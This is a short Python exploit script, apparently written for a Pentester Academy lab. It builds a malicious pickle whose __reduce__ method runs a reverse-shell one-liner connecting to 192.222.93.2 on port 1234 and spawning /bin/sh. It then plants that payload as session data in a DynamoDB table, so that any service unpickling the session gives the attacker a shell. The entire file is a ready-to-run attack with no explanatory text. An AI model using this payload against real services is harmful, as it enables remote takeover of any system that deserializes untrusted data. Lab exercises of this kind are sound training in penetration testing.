import pickle
import subprocess
import os
import boto3


class Shell(object):
    def __reduce__(self):
        return (os.system, ("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.222.93.2\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'&",))


pickledData = pickle.dumps(Shell())

client = boto3.client("dynamodb",endpoint_url="http://dynamodb.pentesteracademylab.appspot.com:4567")

client.put_item(
    Item={
        "sessionid":
        {
            'S': '291861251854427087918706439262060355831'
        },
        "sessionData":
        {
            'B':pickledData
        }
    }, TableName='session'
)